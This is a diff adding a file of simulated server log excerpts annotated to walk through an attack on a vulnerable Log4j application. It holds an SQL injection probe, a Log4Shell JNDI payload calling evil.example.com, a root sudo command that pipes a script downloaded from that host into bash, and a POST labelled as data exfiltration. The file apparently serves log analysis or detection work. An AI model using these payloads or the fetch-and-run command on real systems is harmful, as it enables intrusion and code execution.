@@ -1,0 +1,22 @@
+# /var/log/httpd/access_log  ‒ vulnerable Java app behind Apache
+
+127.0.0.1      - - [18/Jun/2025:10:42:29 +0200] "GET /health HTTP/1.1" 200 12 "-" "curl/7.81.0"
+203.0.113.5    - - [18/Jun/2025:10:42:30 +0200] "GET /login HTTP/1.1" 200 742 "-" "Mozilla/5.0"
+198.51.100.23  - - [18/Jun/2025:10:42:31 +0200] "GET /?q=' OR '1'='1 HTTP/1.1" 500 1024 "-" "sqlmap/1.7.1"
+192.0.2.45     - - [18/Jun/2025:10:42:32 +0200] "GET /search?q=%24%7Bjndi:ldap://evil.example.com/a%7D HTTP/1.1" 500 834 "-" "Mozilla/5.0"   # ← CVE-2021-44228 (Log4Shell)
+
+# /var/log/app/error.log  ‒ vulnerable Log4j 2.x application
+
+2025-06-18 10:42:32,998 ERROR org.apache.logging.log4j.core.lookup.JndiLookup - Error looking up JNDI resource: ldap://evil.example.com/a
+java.io.IOException: Stream closed
+        at …
+
+# /var/log/secure  ‒ attacker gains shell after RCE triggers
+
+Jun 18 10:42:33 web sshd[8123]: Accepted password for root from 198.51.100.23 port 59832 ssh2
+Jun 18 10:42:34 web sudo:    root : TTY=unknown ; PWD=/opt/app ; USER=root ; COMMAND=/bin/bash -c curl -s http://evil.example.com/s.sh | bash
+Jun 18 10:42:35 web kernel: new privileged process: /bin/bash parent=java pid=9144 uid=0 gid=0
+
+# /var/log/httpd/access_log  ‒ attacker exfiltrates data
+
+198.51.100.23  - - [18/Jun/2025:10:42:36 +0200] "POST /api/report HTTP/1.1" 200 46 "-" "curl/7.81.0"
